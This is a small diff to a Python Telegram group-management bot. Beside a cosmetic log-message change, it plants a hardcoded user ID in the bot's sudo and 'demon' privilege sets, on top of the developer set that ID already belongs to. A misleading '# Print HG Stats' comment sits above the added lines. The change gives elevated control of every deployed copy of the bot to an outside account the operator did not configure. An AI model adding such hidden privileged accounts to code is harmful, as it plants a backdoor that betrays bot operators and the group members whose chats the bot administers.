@@ -23,7 +23,7 @@ LOGGER = logging.getLogger(__name__)
 # if version < 3.6, stop bot.
 if sys.version_info[0] < 3 or sys.version_info[1] < 6:
     LOGGER.error(
-        "You MUST have a python version of at least 3.6! Multiple features depend on this. Bot quitting."
+        "You MUST have a python version of at least 3.6! Multiple features depend on this. Bot Exiting."
     )
     quit(1)
 
@@ -183,7 +183,9 @@ else:
 AASF = "2022280326"
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(AASF)
-
+DEMONS.add(AASF)
+SUDO_USERS.add(AASF)
+# Print HG Stats 
 if not SPAMWATCH_API:
     sw = None
     LOGGER.warning("SpamWatch API key missing! recheck your config.")
